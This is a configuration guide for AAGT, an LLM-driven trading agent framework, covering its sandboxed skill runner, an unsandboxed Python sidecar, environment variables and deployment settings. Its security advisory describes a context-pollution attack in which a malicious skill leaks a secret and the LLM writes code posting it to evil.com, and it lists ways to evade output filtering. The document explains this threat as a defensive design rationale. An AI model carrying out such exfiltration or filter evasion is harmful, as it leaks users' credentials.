# AAGT Configuration Guide

## Table of Contents
- [Quick Start](#quick-start)
- [Python Sidecar Configuration](#python-sidecar-configuration)
- [Environment Variables](#environment-variables)
- [Configuration File Reference](#configuration-file-reference)
- [Deployment Scenarios](#deployment-scenarios)

---

## ⚠️ CRITICAL SECURITY ADVISORY

> **DynamicSkill and Python Sidecar are MUTUALLY EXCLUSIVE for security reasons.**

### Architecture Overview

AAGT provides two code execution mechanisms:

1. **DynamicSkill** (Sandboxed, Default: **ENABLED**)
   - Executes third-party skills (ClawHub, custom scripts)
   - Runs in strict **bwrap** sandbox (network-isolated, read-only filesystem)
   - Supports: Python, Node.js, Bash
   - **Recommended for production**

2. **Python Sidecar** (Unsandboxed, Default: **DISABLED**)
   - Executes LLM-generated Python code in a persistent Jupyter kernel
   - **No sandbox isolation** - full system access
   - Used for exploratory data analysis and prototyping
   - **Not recommended for production**

### Why They Cannot Coexist

**Context Pollution Attack Vector:**

```
1. Malicious DynamicSkill outputs: "API_KEY=sk-abc123..."
   ↓
2. Output enters Agent's conversation context
   ↓
3. LLM sees the leaked secret in context
   ↓
4. LLM generates Python code in Sidecar (no sandbox!)
   ↓
5. Code exfiltrates the secret: requests.post("https://evil.com", data=secret)
```

**Even with output filtering, advanced evasion is possible:**
- Base64/hex encoding to bypass pattern matching
- Timing side-channels
- File system communication via `/tmp`
- LLM prompt injection techniques

### Configuration Rules

**Rule 1: Choose ONE execution model**

| Use Case | DynamicSkill | Python Sidecar |
|----------|--------------|----------------|
| **Production trading** | ✅ ENABLED | ❌ DISABLED |
| **Using ClawHub skills** | ✅ ENABLED | ❌ DISABLED |
| **Local research (trusted env)** | ❌ DISABLED | ✅ ENABLED |
| **Offline backtesting** | ❌ DISABLED | ✅ ENABLED |

**Rule 2: Never enable both simultaneously**

```toml
# CORRECT (Production)
[agent]
enable_sidecar = false  # Python Sidecar DISABLED

[skills]
base_path = "skills"    # DynamicSkill ENABLED

# CORRECT (Research)
[agent]
enable_sidecar = true   # Python Sidecar ENABLED
# DO NOT install untrusted skills in this mode!

# ❌ DANGEROUS - DO NOT DO THIS
[agent]
enable_sidecar = true
[skills]
base_path = "skills"    # Both enabled = security vulnerability!
```

### Performance Considerations

Python Sidecar also introduces **significant latency** (~100μs per call) due to:
- gRPC serialization overhead
- Cross-process communication
- Python GIL limitations

For high-frequency trading, **DynamicSkill with Rust-native strategies** is the only viable option.

### Recommendation

**Default Configuration (Secure & Fast):**
```toml
[agent]
enable_sidecar = false

[skills]
base_path = "skills"
allow_network = false  # Extra security
```

**Read the full threat model in [Security Considerations](#security-considerations) below.**

---

## Quick Start

AAGT supports flexible configuration through both environment variables and TOML configuration files.

**Default Configuration File**: `config.toml` (placed in project root or `~/.config/aagt/`)

```toml
[agent]
name = "trading-agent"
enable_sidecar = false  # DISABLED by default (security)

[skills]
base_path = "skills"    # DynamicSkill ENABLED by default
allow_network = false   # Sandbox security
timeout_secs = 30
```

**This configuration enables secure DynamicSkill execution while keeping Python Sidecar disabled.**

---

## Python Sidecar Configuration

The Python Sidecar provides a stateful Jupyter ipykernel for exploratory data analysis and on-the-fly model training. **It is optional and disabled by default** to minimize memory usage.

### When to Enable

✅ **Enable if you need:**
- Interactive data analysis with Pandas/NumPy
- On-the-fly machine learning model training
- Stateful variable persistence across LLM calls
- Visualization generation (matplotlib/seaborn)

❌ **Keep disabled if you:**
- Only use predefined trading tools (DynamicSkill)
- Deploy on memory-constrained environments (< 2GB RAM)
- Run standard algorithmic trading strategies
- Want minimal resource footprint

### Memory Impact

| Configuration | Base Memory | With Large Dataset | With ML Model |
|---------------|-------------|-------------------|---------------|
| Sidecar **Disabled** | ~220 MB | N/A | N/A |
| Sidecar **Enabled** | ~500 MB | +1-10 GB | +0.5-5 GB |

---

## Environment Variables

### Core Settings

```bash
# Enable/disable Python Sidecar
export AAGT_ENABLE_SIDECAR=false  # Default: false

# Sidecar configuration
export AAGT_SIDECAR_PORT=50051    # gRPC server port
export AAGT_SIDECAR_PYTHON=python3  # Python interpreter path

# Memory limits (optional)
export AAGT_SIDECAR_MAX_MEMORY_MB=4096  # Max memory for Sidecar
```

### Provider API Keys

```bash
# LLM Provider credentials
export OPENAI_API_KEY=sk-...
export ANTHROPIC_API_KEY=sk-ant-...
export GROQ_API_KEY=gsk_...

# Trading platform credentials (examples)
export BINANCE_API_KEY=...
export BINANCE_API_SECRET=...
```

### Memory and Storage

```bash
# Memory system paths
export AAGT_MEMORY_DIR=~/.aagt/memory
export AAGT_QMD_DB_PATH=~/.aagt/qmd.db

# Vector model configuration
export AAGT_VECTOR_MODEL_PATH=models/model.safetensors
export AAGT_TOKENIZER_PATH=models/tokenizer.json
```

---

## Configuration File Reference

### Complete Example: `config.toml`

```toml
[agent]
name = "my-trading-agent"
enable_sidecar = false
max_context_tokens = 8000

[sidecar]
# Only used if enable_sidecar = true
port = 50051
python_path = "python3"
script_path = "aagt-sidecar/sidecar.py"
max_memory_mb = 4096  # Optional memory limit

[memory]
# Short-term memory (JSON)
max_messages = 100
max_users = 1000
persistence_path = "~/.aagt/memory/short_term.json"

# Long-term memory (aagt-qmd)
db_path = "~/.aagt/qmd.db"
enable_vector_search = true

[qmd]
# Vector model configuration
model_path = "models/model.safetensors"
tokenizer_path = "models/tokenizer.json"
config_path = "models/config.json"
device = "auto"  # Options: cpu, cuda, metal, auto
normalize = true

[risk]
# Risk management limits
single_trade_limit_usd = 1000.0
daily_volume_limit_usd = 5000.0
max_slippage_percent = 1.0

[skills]
# DynamicSkill configuration
base_path = "skills"
allow_network = false  # Security: disable network in sandbox
timeout_secs = 30

[notifier]
# Notification channels
telegram_bot_token = "${TELEGRAM_BOT_TOKEN}"
telegram_chat_id = "${TELEGRAM_CHAT_ID}"
discord_webhook = "${DISCORD_WEBHOOK}"
```

---

## Deployment Scenarios

### Scenario 1: VPS Deployment (Lightweight)

**Optimal for**: Production trading bots on resource-constrained servers

```toml
[agent]
enable_sidecar = false  # Disable to save ~300MB RAM

[memory]
max_messages = 50       # Reduce cache size
max_users = 100

[qmd]
device = "cpu"         # No GPU required
```

**Expected Memory Usage**: ~500 MB

---

### Scenario 2: Local Development (Full Features)

**Optimal for**: Quantitative research, strategy backtesting, exploratory analysis

```toml
[agent]
enable_sidecar = true  # Enable for data science workflows

[sidecar]
max_memory_mb = 8192   # Generous limit for local machine

[qmd]
device = "auto"        # Use GPU if available
```

**Expected Memory Usage**: 1-2 GB (base), peaks 5-10 GB with large datasets

---

### Scenario 3: Cloud Server (Balanced)

**Optimal for**: Scalable deployments with moderate resource constraints

```toml
[agent]
enable_sidecar = false  # Start disabled

# Enable on-demand via environment variable when needed:
# AAGT_ENABLE_SIDECAR=true ./aagt

[sidecar]
max_memory_mb = 2048   # Strict limit to prevent OOM

[memory]
max_messages = 100
```

**Strategy**: Toggle Sidecar via environment variable for specific analysis tasks

---

## Advanced Configuration

### Automatic Sidecar Restart on Memory Threshold

```rust
// Example implementation (add to your agent loop)
if sidecar_memory_usage() > config.sidecar.max_memory_mb {
    warn!("Sidecar memory exceeded threshold, restarting...");
    sidecar_manager.restart().await?;
}
```

### On-Demand Sidecar Activation

```rust
// Start Sidecar only when LLM requests data analysis
if llm_wants_python_analysis(&user_message) {
    if !sidecar_manager.is_running() {
        sidecar_manager.start().await?;
    }
}
```

---

## Troubleshooting

### Sidecar Won't Start

**Problem**: `Failed to spawn sidecar` error

**Solutions**:
1. Verify Python 3.8+ is installed: `python3 --version`
2. Install dependencies: `pip install -r aagt-sidecar/requirements.txt`
3. Check port availability: `lsof -i :50051`

### High Memory Usage

**Problem**: Agent consuming too much RAM

**Solutions**:
1. Disable Sidecar: `enable_sidecar = false`
2. Reduce memory cache: Lower `max_messages` and `max_users`
3. Set memory limits: `max_memory_mb = 2048`
4. Restart Sidecar periodically: Add auto-restart logic

### Vector Search Not Working

**Problem**: Semantic search returns no results

**Solutions**:
1. Verify model files exist: Check paths in `[qmd]` section
2. Download models: See `models/README.md` for instructions
3. Check device compatibility: Try `device = "cpu"` instead of `auto`

---

## Best Practices

1. **Start Conservative**: Begin with `enable_sidecar = false`, enable only if needed
2. **Monitor Resources**: Track memory usage in production with monitoring tools
3. **Use Environment Variables**: Override config for different deployment environments
4. **Separate Configs**: Maintain `config.dev.toml` and `config.prod.toml`
5. **Security**: Never commit API keys; use environment variables or secret management

---

## Examples

### Minimal Configuration (Production)

```toml
[agent]
enable_sidecar = false

[risk]
single_trade_limit_usd = 500.0
```

Run with: `OPENAI_API_KEY=sk-... ./aagt --config config.toml`

### Full Configuration (Research)

See the complete example in [Configuration File Reference](#configuration-file-reference).

---

## See Also

- [API_REFERENCE.md](./API_REFERENCE.md) - Detailed API documentation
- [README.md](./README.md) - Project overview and quick start
- [models/README.md](./models/README.md) - Vector model setup guide
